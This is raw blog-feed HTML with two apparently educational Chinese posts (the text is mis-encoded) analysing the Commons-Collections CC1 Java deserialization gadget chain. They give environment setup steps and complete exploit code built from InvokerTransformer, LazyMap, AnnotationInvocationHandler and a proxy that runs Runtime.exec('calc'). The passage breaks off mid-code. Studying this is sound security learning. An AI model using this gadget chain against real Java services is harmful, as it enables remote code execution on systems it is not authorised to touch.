class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>  </span><br><span class="line">                (<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">Mapdecorate</span> <span class="operator">=</span> LazyMap.decorate(hashMap, invokerTransformer);  </span><br><span class="line">        <span class="comment">//ç›¸å½“äºè£…é¥°å™¨ï¼Œå³æ­¤æ—¶Mapdecorateä¹Ÿæœ‰invokerTransformerå¯¹è±¡çš„åŠŸèƒ½  </span></span><br><span class="line">  </span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">classDeclaredMethod</span> <span class="operator">=</span> lazyMapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);  </span><br><span class="line">        classDeclaredMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        classDeclaredMethod.invoke(Mapdecorate,runtime);  </span><br><span class="line">        <span class="comment">//æœ€åè¿™é‡Œè°ƒç”¨äº†LazyMapçš„getæ–¹æ³•é‡Œé¢æ‰§è¡Œäº†transformæ–¹æ³•ï¼Œå‚æ•°ä¸ºruntime  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301819409.png" alt="image-20230430181951307"><br>è¯æ˜è¿™æ¡é“¾åˆ°ç›®å‰æ˜¯å¯è¡Œçš„ï¼Œç„¶åæ‰¾è°è°ƒç”¨äº†LazyMapä¸­çš„getæ–¹æ³•ï¼Œæœ€ç»ˆç›®æ ‡æ˜¯æ‰¾åˆ°readObject<br>è¿™é‡Œåœ¨AnnotationInvocationHandlerç±»ä¸‹çš„invokeæ–¹æ³•ä¸­è°ƒç”¨äº†getæ–¹æ³•ï¼Œè¿™é‡Œfind usages getæ–¹æ³•çš„è¯ç»“æœå¾ˆå¤šï¼Œæ‰€ä»¥æˆ‘ç›´æ¥åœ¨CC1çš„å¦ä¸€æ¡é“¾ä¸­è¿›å…¥è¿™ä¸ªæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301820476.png" alt="image-20230430182006425"><br>åŒæ—¶è¿™ä¸ªç±»ä¸­ä¹Ÿå­˜åœ¨readObjectæ–¹æ³•ï¼Œç›¸å½“äºæ‰¾åˆ°å…¥å£ï¼Œè€Œä¸”é€šè¿‡æ„é€ æ–¹æ³•å‘ç°è¿™ä¸ªmemberValueä¹Ÿæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥ç°åœ¨æ˜¯è§£å†³æ€ä¹ˆè¿›å…¥è¿™ä¸ªç±»çš„invokeæ–¹æ³•ï¼Œè¿™é‡Œå°±å¯ä»¥ç»“åˆåŠ¨æ€ä»£ç†ï¼Œä¸€ä¸ªç±»è¢«åŠ¨æ€ä»£ç†ä¹‹åæƒ³è¦é€šè¿‡ä»£ç†è°ƒç”¨è¿™ä¸ªç±»å¿…é¡»é€šè¿‡invokeæ–¹æ³•ï¼Œç»§ç»­å¯»æ‰¾<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301820664.png" alt="image-20230430182018517"><br>å¯ä»¥çœ‹åˆ°åœ¨readObjectæ–¹æ³•ä¸­memberValuesè°ƒç”¨äº†entrySetæ–¹æ³•ï¼Œæ‰€ä»¥è¿™é‡Œè®©memberValuesæˆä¸ºä»£ç†å¯¹è±¡é‚£ä¹ˆè°ƒç”¨entrySetæ–¹æ³•æ—¶å°±ä¼šè¿›å…¥invokeæ–¹æ³•</p><h2 id="ç¼–å†™EXP"><a href="#ç¼–å†™EXP" class="headerlink" title="ç¼–å†™EXP"></a>ç¼–å†™EXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//ç”¨äºè§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜ï¼ŒRuntimeä¸èƒ½è¢«åºåˆ—åŒ–  </span></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  </span><br><span class="line">  </span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  </span><br><span class="line">        <span class="comment">//InvocationHandlerè§£å†³proxyMapä¸èƒ½åºåˆ—åŒ–ï¼Œç„¶åé€šè¿‡æ„é€ æ–¹æ³•å°†ä»£ç†å¯¹è±¡proxyMapèµ‹å€¼ç»™memberValues  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–ä¸ååºåˆ—åŒ–  </span></span><br><span class="line">        serialize(invocationHandler);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301820365.png" alt="image-20230430182035279"></p><h2 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">InvokeTransformer#transform</span><br><span class="line">LazyMap#get</span><br><span class="line">AnnotationInvocationHandler#readObject</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¾…åŠ©é“¾</span><br><span class="line">ChainedTransformer</span><br><span class="line">ConstantTransformer</span><br><span class="line">HashMap</span><br><span class="line">Map(Proxy)#entrySet</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæµç¨‹å›¾æ‡’å¾—ç”»äº†ï¼Œå¼€æ‘†</p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹CCé“¾1</title>
      <link href="/undefined/45527.html"/>
      <url>/undefined/45527.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ„Ÿè§‰æœ€è¿‘Javaè€ƒçš„ç”¨çš„å¾ˆå¤šï¼Œè‡ªå·±å¯¹äºJavaæ˜¯0åŸºç¡€ï¼Œè®©æˆ‘è¿«åˆ‡æƒ³è¦å¼€å§‹å­¦ï¼Œçœ‹äº†å¤§ä½¬çš„å­¦ä¹ é“¾æ˜¯ä»å¼€å‘å¼€å§‹ï¼Œé‚£æ ·æ„Ÿè§‰å°±å¤ªæ…¢äº†è€Œä¸”è‡ªå·±å¯¹äºå¼€å‘å…´è¶£ä¸å¤§ï¼Œä½†æ˜¯åååˆç¦»ä¸å¼€å¼€å‘ï¼Œåªèƒ½è¾¹å­¦å¼€å‘è¾¹çœ‹å®‰å…¨ï¼Œè™½ç„¶æœ‰ç‚¹æ€¥äº†ä½†æ˜¯ä¹Ÿæ²¡åŠæ³•äº†</p><h2 id="ä¸€ç‚¹å»ºè®®"><a href="#ä¸€ç‚¹å»ºè®®" class="headerlink" title="ä¸€ç‚¹å»ºè®®"></a>ä¸€ç‚¹å»ºè®®</h2><p>å¦‚æœæ²¡æœ‰å­¦è¿‡Javaæˆ–è€…ä¸äº†è§£ideaçš„æ“ä½œçš„è¯å¼€å§‹CCé“¾ä¹‹å‰å¼ºçƒˆå»ºè®®å…ˆè·ŸURLDNSé“¾ï¼ŒæŠŠè¯¥è¸©çš„å‘è¸©äº†å†å¼„CCé“¾ä¼šé¡ºç•…å¾ˆå¤š</p><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>è¿™é‡Œæˆ‘å°±åˆ—ä¸€ä¸‹è‡ªå·±è¸©çš„å‘ï¼Œä½œä¸ºä¸€ä¸ªå¯¹Javaå’Œideaä¸ç†Ÿæ‚‰çš„æ–°æ‰‹å®¹æ˜“çŠ¯çš„é”™</p><h3 id="jdk"><a href="#jdk" class="headerlink" title="jdk"></a>jdk</h3><p>jdkè¦æ±‚æ˜¯jdk8u65ï¼Œåœ¨å®˜ç½‘æˆ‘ä¸‹è½½çš„æ—¶å€™é€‰æ‹©8u65ä½†æ˜¯ä¸‹è½½çš„å´ä¸æ˜¯ï¼Œ<a href="https://blog.lupf.cn/articles/2022/02/20/1645352101537.html">å¦å¤–çš„å¹³å°</a><br>å®‰è£…ä¼šåŒæ—¶å®‰è£…jdkå’Œjreæˆ‘ä»¬éœ€è¦çš„æ˜¯jdkä¸è¦æŠŠjreä¹Ÿæ”¾åœ¨jdkç›®å½•ä¸‹ï¼Œä¸ç„¶ideaå¯¼å…¥jdkä¼šå¤±è´¥ä¸‹è½½å®Œçš„ç›®å½•å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262142103.png" alt="image-20230426214158005"></p><h3 id="åŠ å…¥ä¾èµ–"><a href="#åŠ å…¥ä¾èµ–" class="headerlink" title="åŠ å…¥ä¾èµ–"></a>åŠ å…¥ä¾èµ–</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;3.2.1&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå½“åˆ›å»ºå¥½mavené¡¹ç›®ååœ¨ä¾èµ–ä¸­å¦‚æœæ²¡æœ‰æ”¾ä¾èµ–çš„æ ‡ç­¾<code>&lt;dependencies&gt; &lt;/dependencies&gt;</code>é‚£ä¹ˆéœ€è¦ä½ è‡ªå·±å»åˆ›å»ºï¼Œä½ çš„ä¾èµ–å¿…é¡»ç”±å®ƒåŒ…è£¹</p><h2 id="å…¶å®ƒç¯å¢ƒ"><a href="#å…¶å®ƒç¯å¢ƒ" class="headerlink" title="å…¶å®ƒç¯å¢ƒ"></a>å…¶å®ƒç¯å¢ƒ</h2><p>å‚è€ƒï¼š<br><a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/">Javaååºåˆ—åŒ–Commons-Collectionsç¯‡01-CC1é“¾ | Drunkbabyâ€™s Blog (drun1baby.top)</a><br><a href="https://www.lengf233.top/2023/03/19/ru-he-shou-xie-yi-tiao-cc1-lian/">https://www.lengf233.top/2023/03/19/ru-he-shou-xie-yi-tiao-cc1-lian/</a><br>åŸºæœ¬ä¸Šå°±æ²¡å•¥é—®é¢˜äº†</p><h2 id="Common-Collections-ç›¸å…³ä»‹ç»"><a href="#Common-Collections-ç›¸å…³ä»‹ç»" class="headerlink" title="Common-Collections ç›¸å…³ä»‹ç»"></a>Common-Collections ç›¸å…³ä»‹ç»</h2><p>è¿™ä¸€éƒ¨åˆ†å‰è¾ˆä»¬å·²ç»è¯´çš„å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘è¿™é‡Œæ”¾ä¸€ä¸‹æ–¹ä¾¿è‡ªå·±è§‚çœ‹<br><a href="http://commons.apache.org/">Apache Commons</a>æ˜¯Apacheè½¯ä»¶åŸºé‡‘ä¼šçš„é¡¹ç›®ï¼Œæ›¾ç»éš¶å±äº<code>Jakarta</code>é¡¹ç›®ã€‚<code>Commons</code>çš„ç›®çš„æ˜¯æä¾›å¯é‡ç”¨çš„ã€è§£å†³å„ç§å®é™…çš„é€šç”¨é—®é¢˜ä¸”å¼€æºçš„Javaä»£ç ã€‚Commonsç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š<code>Proper</code>ï¼ˆæ˜¯ä¸€äº›å·²å‘å¸ƒçš„é¡¹ç›®ï¼‰ã€<code>Sandbox</code>ï¼ˆæ˜¯ä¸€äº›æ­£åœ¨å¼€å‘çš„é¡¹ç›®ï¼‰å’Œ<code>Dormant</code>ï¼ˆæ˜¯ä¸€äº›åˆšå¯åŠ¨æˆ–è€…å·²ç»åœæ­¢ç»´æŠ¤çš„é¡¹ç›®ï¼‰ã€‚</p><ul><li>ç®€å•æ¥è¯´ï¼ŒCommon-Collections è¿™ä¸ªé¡¹ç›®å¼€å‘å‡ºæ¥æ˜¯ä¸ºäº†ç»™ Java æ ‡å‡†çš„ <code>Collections API</code> æä¾›äº†ç›¸å½“å¥½çš„è¡¥å……ã€‚åœ¨æ­¤åŸºç¡€ä¸Šå¯¹å…¶å¸¸ç”¨çš„æ•°æ®ç»“æ„æ“ä½œè¿›è¡Œäº†å¾ˆå¥½çš„å°è£…ã€æŠ½è±¡å’Œè¡¥å……ã€‚</li></ul><h3 id="åŒ…ç»“æ„ä»‹ç»"><a href="#åŒ…ç»“æ„ä»‹ç»" class="headerlink" title="åŒ…ç»“æ„ä»‹ç»"></a>åŒ…ç»“æ„ä»‹ç»</h3><ul><li><code>org.apache.commons.collections</code> â€“ CommonsCollectionsè‡ªå®šä¹‰çš„ä¸€ç»„å…¬ç”¨çš„æ¥å£å’Œå·¥å…·ç±»</li><li><code>org.apache.commons.collections.bag</code> â€“ å®ç°Bagæ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.bidimap</code> â€“ å®ç°BidiMapç³»åˆ—æ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.buffer</code> â€“ å®ç°Bufferæ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.collection</code> â€“å®ç°java.util.Collectionæ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.comparators</code>â€“ å®ç°java.util.Comparatoræ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.functors</code> â€“Commons Collectionsè‡ªå®šä¹‰çš„ä¸€ç»„åŠŸèƒ½ç±»</li><li><code>org.apache.commons.collections.iterators</code> â€“ å®ç°java.util.Iteratoræ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.keyvalue</code> â€“ å®ç°é›†åˆå’Œé”®&#x2F;å€¼æ˜ å°„ç›¸å…³çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.list</code> â€“ å®ç°java.util.Listæ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.map</code> â€“ å®ç°Mapç³»åˆ—æ¥å£çš„ä¸€ç»„ç±»</li><li><code>org.apache.commons.collections.set</code> â€“ å®ç°Setç³»åˆ—æ¥å£çš„ä¸€ç»„ç±»</li></ul><h2 id="å¼€å§‹åˆ†æ"><a href="#å¼€å§‹åˆ†æ" class="headerlink" title="å¼€å§‹åˆ†æ"></a>å¼€å§‹åˆ†æ</h2><p>CC1é“¾åˆ†ä¸ºä¸¤ä¸ªç‰ˆæœ¬ï¼Œè¿™é‡Œå¼•ç”¨ä¸€ä¸‹lengf233å¸ˆå‚…çš„ä»‹ç»ï¼Œâ€œå…³äºCC1é“¾å…¶å®æ˜¯æœ‰ä¸¤æ¡çš„ï¼Œä¸€ä¸ªæ˜¯LazyMapè¿™ä¸€æ¡é“¾ï¼Œå¦å¤–ä¸€æ¡å°±æ˜¯TransformMapé“¾ï¼Œç¬¬äºŒæ¡é“¾æ˜¯ä¼ å…¥å›½å†…ä¹‹åè¢«å‘ç°çš„ã€‚â€å¾ˆå¤šåˆ†ææ–‡ç« æ²¡æœ‰ä»‹ç»è¿™ä¸€ç‚¹ï¼Œæˆ‘ä¹Ÿæ˜¯çœ‹äº†å¸ˆå‚…çš„æ–‡ç« æ‰çŸ¥é“ï¼Œè¿™é‡Œåˆ†æTransformMapé“¾<br>ç”¨ä¸€ä¸‹ä½¬çš„æµç¨‹åˆ†æå›¾<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262144895.png" alt="image-20230426214421823"><br>æˆ‘ä»¬çš„ç›®çš„æ˜¯åœ¨æœ€åçš„å‘½ä»¤æ‰§è¡Œï¼Œæ—¢ç„¶åœ¨æœ€åé‚£ä¹ˆå¿…ç„¶éœ€è¦ä¸€ä¸ªåˆ°è¿™é‡Œçš„ç±»ï¼Œé€‰æ‹©ä¸€ä¸ªæ¥æ”¶ä»»æ„å¯¹è±¡å«æœ‰readObjectæ–¹æ³•çš„ç±»ä½œä¸ºå…¥å£ç±»ï¼Œä¸­é—´ç”¨é“¾å­å…¶å®ƒæ–¹æ³•é“¾èµ·æ¥é‚£ä¹ˆå°±åˆ°è¾¾äº†ç›®çš„</p><h3 id="é€†å‘åˆ†æï¼Œå¯»æ‰¾execæ–¹æ³•"><a href="#é€†å‘åˆ†æï¼Œå¯»æ‰¾execæ–¹æ³•" class="headerlink" title="é€†å‘åˆ†æï¼Œå¯»æ‰¾execæ–¹æ³•"></a>é€†å‘åˆ†æï¼Œå¯»æ‰¾execæ–¹æ³•</h3><p>æˆ‘ä»¬ç›´æ¥æ‰¾å“ªé‡Œä¼šè°ƒç”¨execæ–¹æ³•ï¼Œå‰äººç»éªŒåœ¨Transformeræ¥å£ä¸­ï¼Œæ‰€ä»¥ç›´æ¥åˆ°è¿™é‡Œæ¥ï¼Œåœ¨Common-Collections.jaråŒ…ä¸­æ‰¾åˆ°è¿™ä¸ªæ¥å£<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262144606.png" alt="image-20230426214435545"><br>ç„¶åctrl+alt+bå¯ä»¥æŸ¥çœ‹å®ç°äº†è¯¥æ¥å£çš„ç±»ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†InvokerTransformerç±»ï¼Œåœ¨è¯¥ç±»ä¸‹æœ‰ä¸ªtransformæ–¹æ³•é‡Œé¢è°ƒç”¨äº†invokeæ–¹æ³•ï¼Œæ­¤æ—¶è¿˜æ²¡æ„Ÿè§‰æœ‰ä»€ä¹ˆï¼Œæˆ‘ä»¬è·Ÿè¿›çœ‹ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°å®ƒæ‰€åœ¨çš„ç±»ä¸ºMethodç±»ï¼Œè¿™ä¸ªç±»æ‰€åœ¨çš„åŒ…ä¸ºJavaä¸­é¼é¼å¤§åçš„åå°„åŒ…ï¼ŒMethodä¸­<strong>invoke</strong>(Object obj,Objectâ€¦args)æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç±»çš„å®ä¾‹ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºç›¸åº”å‡½æ•°ä¸­çš„å‚æ•°<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262144759.png" alt="image-20230426214448720"><br>é‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨åå°„è°ƒç”¨ä»»æ„ç±»ï¼Œå…ˆå°è¯•åˆ©ç”¨å®ƒæ¥å¼¹ä¸ªè®¡ç®—å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//è·å–Runtimeå®ä¾‹  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> runtime.getClass();  <span class="comment">//è·å–Classå®ä¾‹å¯¹è±¡  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">cMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);  <span class="comment">//åˆ©ç”¨åå°„è·å–Runtimeçš„execæ–¹æ³•  </span></span><br><span class="line">  </span><br><span class="line">        cMethod.invoke(runtime,<span class="string">&quot;calc&quot;</span>);  <span class="comment">//åœ¨runtimeå®ä¾‹ä¸Šè°ƒç”¨execæ–¹æ³•å¹¶ä¼ å…¥calcå‚æ•°  </span></span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåå°„è°ƒç”¨execæ–¹æ³•ä¸ºï¼Œå…ˆå¾—åˆ°Runtimeç±»çš„å¯¹è±¡runtimeï¼Œå†å¾—åˆ°ç±»ä¸­æ‰€æœ‰æ–¹æ³•çš„å¯¹è±¡cï¼Œ<br>ç„¶åå¾—åˆ°execæ–¹æ³•å¹¶èµ‹å€¼ç»™cMethodï¼Œç„¶åä½¿ç”¨Methodç±»çš„invokeæ–¹æ³•æ‰§è¡ŒRuntimeç±»ä¸­çš„execæ–¹æ³•å¹¶ä¼ å…¥å‚æ•°calcï¼Œä¹Ÿæœ‰ä¸€ç§é“¾å­çš„æ„Ÿè§‰<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262145805.png" alt="image-20230426214518703"><br>ç„¶åæ”¹å†™ä¸ºInvokerTransformerç±»ä¸­çš„transformæ–¹æ³•æ¥å¼¹ï¼Œç”±äºtransformæ–¹æ³•ä¸ºpublicæ‰€ä»¥æ— éœ€åå°„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span 